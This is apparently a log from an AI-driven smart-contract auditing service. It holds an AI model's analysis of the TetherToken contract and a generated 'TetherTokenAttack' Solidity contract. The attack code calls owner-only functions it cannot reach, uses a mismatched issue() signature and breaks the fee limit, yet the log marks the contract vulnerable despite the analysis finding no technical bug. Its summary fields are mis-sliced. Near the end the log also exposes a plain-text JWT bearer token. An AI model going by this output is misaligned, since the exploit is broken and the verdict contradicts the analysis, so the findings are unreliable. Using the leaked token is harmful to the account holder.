deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'raw_response': '1. Contract Analysis:\n\n- The main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:\n  - Pausable functionality (pause/unpause by owner)\n  - Blacklist functionality (owner can blacklist addresses, preventing transfers)\n  - Upgradeability mechanism (can deprecate itself and forward calls to an upgraded contract)\n  - Fee mechanism (basisPointsRate and maximumFee, though initially set to zero)\n  - Minting (issue) and burning (redeem) tokens by owner\n  - Ability for owner to destroy tokens of blacklisted users (destroyBlackFunds)\n  \n- Other contracts (Ownable, Pausable, BlackList, StandardToken, BasicToken, SafeMath) are standard utility or base contracts supporting TetherToken.\n\n- Solidity version pragma is `^0.4.17`.\n\n2. Vulnerability Assessment:\n\n**A. Centralization / Owner Privileges:**\n\n- The owner has extensive control:\n  - Can pause/unpause all token transfers.\n  - Can blacklist any address, blocking their transfers.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating user funds.\n  - Can issue new tokens arbitrarily, inflating supply and crediting self.\n  - Can redeem (burn) tokens from own balance.\n  - Can deprecate the contract and redirect all calls to an upgraded contract.\n  - Can set fee parameters (basisPointsRate and maximumFee).\n\n**Impact:**  \nThis centralization means the owner can censor users, confiscate tokens, inflate supply, and upgrade to arbitrary code. This is a trust assumption risk rather than a technical bug, but it is a critical security consideration.\n\n---\n\n**B. Blacklist and Destroy Black Funds Function:**\n\n- `destroyBlackFunds(address _blackListedUser)` allows owner to zero out the balance of any blacklisted user and reduce total supply accordingly.\n\n- No user consent or checks beyond blacklist status.\n\n**Impact:**  \nOwner can arbitrarily confiscate tokens from any blacklisted user, which can be abused or lead to loss of user funds.\n\n---\n\n**C. Upgradeability Risks:**\n\n- `deprecate(address _upgradedAddress)` allows owner to mark the contract as deprecated and forward all ERC20 calls to the upgraded contract.\n\n- The upgraded contract address is fully controlled by the owner.\n\n**Impact:**  \nOwner can upgrade to malicious contract and steal tokens or break functionality. Users interacting with the deprecated contract will be redirected to the new contract, which may have arbitrary logic.\n\n---\n\n**D. Fee Parameters:**\n\n- Owner can set fees with `setParams(uint newBasisPoints, uint newMaxFee)` with limits:\n\n  - `newBasisPoints < 20` (max 0.2%)\n  - `newMaxFee < 50` (max 50 tokens, scaled by decimals)\n\n- Fees are deducted on transfers and credited to owner.\n\n**Impact:**  \nOwner can impose fees on all transfers, which may be unexpected by users.\n\n---\n\n**E. ERC20 Approve Race Condition:**\n\n- The approve function requires allowance to be zero before setting a new non-zero allowance:\n\n  ```solidity\n  require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n  ```\n\n- This is a known mitigation for the ERC20 approve race condition, so no issue here.\n\n---\n\n**F. No Reentrancy or Math Vulnerabilities:**\n\n- Uses SafeMath for all arithmetic.\n\n- No external calls during state changes except events and upgrade forwarding.\n\n- No payable functions or ETH handling.\n\n---\n\n**G. No Access Control on `transferOwnership` to zero address:**\n\n- The `transferOwnership` function prevents setting owner to zero address:\n\n  ```solidity\n  if (newOwner != address(0)) {\n      owner = newOwner;\n  }\n  ```\n\n- So no risk of owner renouncing ownership accidentally.\n\n---\n\n3. Exploitation Requirements:\n\n- Exploitation of owner privileges requires control of the owner private key.\n\n- No direct vulnerability allows an attacker to escalate privileges or bypass owner controls.\n\n- Users must trust the owner not to misuse blacklist, destroyBlackFunds, issue, redeem, deprecate, or fee-setting functions.\n\n---\n\n**Summary:**\n\n- The contract is a centralized token with owner having powerful controls over token supply, user balances (via blacklist and destroy), pausing, and upgradeability.\n\n- No technical vulnerabilities like reentrancy, integer overflow, or access control bypasses are present.\n\n- The main risk is **centralization and trust in the owner**, who can arbitrarily confiscate tokens, impose fees, pause transfers, mint tokens, or upgrade to malicious contracts.\n\n---\n\n**Solidity Version:**  \n`pragma solidity ^0.4.17;`', 'reasoning': '- The main contract with business logic and user funds is **TetherToken**, an ERC20 token contract with additional features:\n  - Pausable functionality (pause/unpause by owner)\n  - Blacklist functionality (owner can blacklist addresses, preventing transfers)\n  - Upgradeability mechanism (can deprecate itself and forward calls to an upgraded contract)\n  - Fee mechanism (basisPointsRate and maximumFee, though initially set to zero)\n  - Minting (issue) and burning (redeem) tokens by owner\n  - Ability for owner to destroy tokens of blacklisted users (destroyBlackFunds)\n  \n- Other contracts (Ownable, Pausable, BlackList, StandardToken, BasicToken, SafeMath) are standard utility or base contracts supporting TetherToken.\n\n- Solidity version pragma is `^0.4.17`.\n\n2.', 'summary': '**A. Centralization / Owner Privileges:**\n\n- The owner has extensive control:\n  - Can pause/unpause all token transfers.\n  - Can blacklist any address, blocking their transfers.\n  - Can destroy tokens of blacklisted addresses, effectively confiscating user funds.\n  - Can issue new tokens arbitrarily, inflating supply and crediting self.\n  - Can redeem (burn) tokens from own balance.\n  - Can deprecate the contract and redirect all calls to an upgraded contract.\n  - Can set fee parameters (basisPointsRate and maximumFee).\n\n**Impact:**  \nThis centralization means the owner can censor users, confiscate tokens, inflate supply, and upgrade to arbitrary code. This is a trust assumption risk rather than a technical bug, but it is a critical security consideration.\n\n---\n\n**B. Blacklist and Destroy Black Funds Function:**\n\n- `destroyBlackFunds(address _blackListedUser)` allows owner to zero out the balance of any blacklisted user and reduce total supply accordingly.\n\n- No user consent or checks beyond blacklist status.\n\n**Impact:**  \nOwner can arbitrarily confiscate tokens from any blacklisted user, which can be abused or lead to loss of user funds.\n\n---\n\n**C. Upgradeability Risks:**\n\n- `deprecate(address _upgradedAddress)` allows owner to mark the contract as deprecated and forward all ERC20 calls to the upgraded contract.\n\n- The upgraded contract address is fully controlled by the owner.\n\n**Impact:**  \nOwner can upgrade to malicious contract and steal tokens or break functionality. Users interacting with the deprecated contract will be redirected to the new contract, which may have arbitrary logic.\n\n---\n\n**D. Fee Parameters:**\n\n- Owner can set fees with `setParams(uint newBasisPoints, uint newMaxFee)` with limits:\n\n  - `newBasisPoints < 20` (max 0.2%)\n  - `newMaxFee < 50` (max 50 tokens, scaled by decimals)\n\n- Fees are deducted on transfers and credited to owner.\n\n**Impact:**  \nOwner can impose fees on all transfers, which may be unexpected by users.\n\n---\n\n**E. ERC20 Approve Race Condition:**\n\n- The approve function requires allowance to be zero before setting a new non-zero allowance:\n\n  ```solidity\n  require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\n  ```\n\n- This is a known mitigation for the ERC20 approve race condition, so no issue here.\n\n---\n\n**F. No Reentrancy or Math Vulnerabilities:**\n\n- Uses SafeMath for all arithmetic.\n\n- No external calls during state changes except events and upgrade forwarding.\n\n- No payable functions or ETH handling.\n\n---\n\n**G. No Access Control on `transferOwnership` to zero address:**\n\n- The `transferOwnership` function prevents setting owner to zero address:\n\n  ```solidity\n  if (newOwner != address(0)) {\n      owner = newOwner;\n  }\n  ```\n\n- So no risk of owner renouncing ownership accidentally.\n\n---\n\n3.', 'code': "pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(address _to, uint _amount) external;\n    function redeem(uint _amount) external;\n    function deprecate(address _upgradedAddress) external;\n    function setParams(uint newBasisPoints, uint newMaxFee) external;\n    function transferOwnership(address newOwner) external;\n}\n\ncontract TetherTokenAttack {\n    ITetherToken public target;\n\n    function TetherTokenAttack(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address upgradedContract) public {\n        // Blacklist victim\n        target.blacklist(victim);\n        // Destroy victim's tokens\n        target.destroyBlackFunds(victim);\n        // Mint new tokens to attacker (this contract)\n        target.issue(this, 1000 ether);\n        // Redeem some tokens from attacker\n        target.redeem(500 ether);\n        // Set fees to max allowed (0.2% and 50 tokens)\n        target.setParams(20, 50);\n        // Deprecate to upgraded malicious contract\n        target.deprecate(upgradedContract);\n    }\n}", 'code_type': 'solidity', 'duration': 31.25250554084778}
2025-07-05 13:06:37,712 - app.services.contract_service - INFO - Has exploit code: True
2025-07-05 13:06:37,714 - app.services.contract_service - INFO - No vulnerabilities mentioned: False
2025-07-05 13:06:37,716 - app.services.contract_service - INFO - Final vulnerability determination: True
2025-07-05 13:06:37,719 - app.services.contract_service - INFO - Attack strategy summary: **A. Centralization / Owner Privileges:**

- The owner has extensive control:
  - Can pause/unpause all token transfers.
  - Can blacklist any address, blocking their transfers.
  - Can destroy tokens of blacklisted addresses, effectively confiscating user funds.
  - Can issue new tokens arbitrarily, inflating supply and crediting self.
  - Can redeem (burn) tokens from own balance.
  - Can deprecate the contract and redirect all calls to an upgraded contract.
  - Can set fee parameters (basisPointsRate and maximumFee).

**Impact:**  
This centralization means the owner can censor users, confiscate tokens, inflate supply, and upgrade to arbitrary code. This is a trust assumption risk rather than a technical bug, but it is a critical security consideration.

---

**B. Blacklist and Destroy Black Funds Function:**

- `destroyBlackFunds(address _blackListedUser)` allows owner to zero out the balance of any blacklisted user and reduce total supply accordingly.

- No user consent or checks beyond blacklist status.

**Impact:**  
Owner can arbitrarily confiscate tokens from any blacklisted user, which can be abused or lead to loss of user funds.

---

**C. Upgradeability Risks:**

- `deprecate(address _upgradedAddress)` allows owner to mark the contract as deprecated and forward all ERC20 calls to the upgraded contract.

- The upgraded contract address is fully controlled by the owner.

**Impact:**  
Owner can upgrade to malicious contract and steal tokens or break functionality. Users interacting with the deprecated contract will be redirected to the new contract, which may have arbitrary logic.

---

**D. Fee Parameters:**

- Owner can set fees with `setParams(uint newBasisPoints, uint newMaxFee)` with limits:

  - `newBasisPoints < 20` (max 0.2%)
  - `newMaxFee < 50` (max 50 tokens, scaled by decimals)

- Fees are deducted on transfers and credited to owner.

**Impact:**  
Owner can impose fees on all transfers, which may be unexpected by users.

---

**E. ERC20 Approve Race Condition:**

- The approve function requires allowance to be zero before setting a new non-zero allowance:

  ```solidity
  require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));
  ```

- This is a known mitigation for the ERC20 approve race condition, so no issue here.

---

**F. No Reentrancy or Math Vulnerabilities:**

- Uses SafeMath for all arithmetic.

- No external calls during state changes except events and upgrade forwarding.

- No payable functions or ETH handling.

---

**G. No Access Control on `transferOwnership` to zero address:**

- The `transferOwnership` function prevents setting owner to zero address:

  ```solidity
  if (newOwner != address(0)) {
      owner = newOwner;
  }
  ```

- So no risk of owner renouncing ownership accidentally.

---

3.
2025-07-05 13:06:37,721 - app.services.contract_service - INFO - Analysis completed with status: KO
2025-07-05 13:06:37,725 - app.services.contract_service - INFO - Temporary file /tmp/tmp5_sqpw4u.sol removed
2025-07-05 13:06:37,755 - app.api.contract - INFO - Report saved with filename: Ownable_2025-07-05_13-06, status: KO
2025-07-05 13:06:37,757 - app.api.contract - INFO - Analysis completed successfully, returning report
2025-07-05 13:06:37,760 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:06:37,762 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:06:37,763 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:06:37,765 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:06:37,768 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:06:37] "POST /analyze HTTP/1.1" 200 -
2025-07-05 13:06:48,102 - flask_cors.extension - DEBUG - Request to ''/analysis/status/3'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:06:48,111 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:06:48,115 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:06:48,118 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:06:48,121 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:06:48,126 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:06:48] "[33mGET /analysis/status/3 HTTP/1.1[0m" 404 -
2025-07-05 13:07:08,725 - flask_cors.extension - DEBUG - Request to ''/analysis/status/2'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:07:08,730 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:07:08,732 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:07:08,736 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:07:08,741 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:07:08,744 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:07:08] "[33mOPTIONS /analysis/status/2 HTTP/1.1[0m" 404 -
2025-07-05 13:07:38,732 - app.api.contract - INFO - Received analyze request from wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:07:38,750 - app.api.contract - INFO - Analyzing code snippet
2025-07-05 13:07:38,770 - app.api.contract - INFO - Starting contract analysis for user: 1
2025-07-05 13:07:38,775 - app.services.contract_service - INFO - Created temporary file for contract code: /tmp/tmpdym0b1lk.sol
2025-07-05 13:07:38,785 - app.services.contract_service - INFO - Connected to Ganache at http://ganache:8545
2025-07-05 13:07:38,786 - app.services.contract_service - INFO - Compiling contract...
2025-07-05 13:07:38,794 - app.services.contract_service - INFO - Compilation result: 0 contracts compiled
2025-07-05 13:07:38,796 - app.services.contract_service - WARNING - No contracts compiled
2025-07-05 13:07:38,797 - app.services.contract_service - INFO - Temporary file /tmp/tmpdym0b1lk.sol removed
2025-07-05 13:07:38,798 - app.api.contract - WARNING - No valid Solidity contract found in the provided code
2025-07-05 13:07:38,801 - flask_cors.extension - DEBUG - Request to ''/analyze'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:07:38,804 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:07:38,805 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:07:38,806 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-05 13:07:38,809 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:07:38] "[31m[1mPOST /analyze HTTP/1.1[0m" 400 -
2025-07-05 13:08:54,454 - flask_cors.extension - DEBUG - Request to ''/analysis/status/2'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:08:54,463 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:08:54,467 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:08:54,471 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:08:54,474 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:08:54,478 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:08:54] "[33mOPTIONS /analysis/status/2 HTTP/1.1[0m" 404 -
2025-07-05 13:11:16,403 - flask_cors.extension - DEBUG - Request to ''/analysis/status/3'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-05 13:11:16,417 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-05 13:11:16,419 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-05 13:11:16,422 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-05 13:11:16,426 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-05 13:11:16,431 - werkzeug - INFO - 192.168.96.1 - - [05/Jul/2025 13:11:16] "[33mOPTIONS /analysis/status/3 HTTP/1.1[0m" 404 -
2025-07-05 13:13:08,832 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-05 13:13:09,017 - app.app - INFO - Application started
2025-07-05 13:13:09,029 - werkzeug - INFO - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://192.168.112.5:8000
2025-07-05 13:13:09,031 - werkzeug - INFO - [33mPress CTRL+C to quit[0m
2025-07-05 13:13:10,222 - app.api.auth - INFO - Received login request with method: POST
2025-07-05 13:13:10,245 - app.api.auth - INFO - Request headers: {'Host': 'localhost:4455', 'Accept': 'application/json', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTE3MjQyNzZ9.czULnaYT1NPRpM2uyatILGe_bp1FVwuCdNuTgk-EI7s', 'Sec-Fetch-Site': 'same-site', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Sec-Fetch-Mode': 'cors', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'empty'}
2025-07-05 13:13:10,252 - app.api.auth - INFO - Request content type: application/json
2025-07-05 13:13:10,297 - app.api.auth - INFO - Processing JSON request
2025-07-05 13:13:10,325 - app.api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-05 13:13:11,256 - app.api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
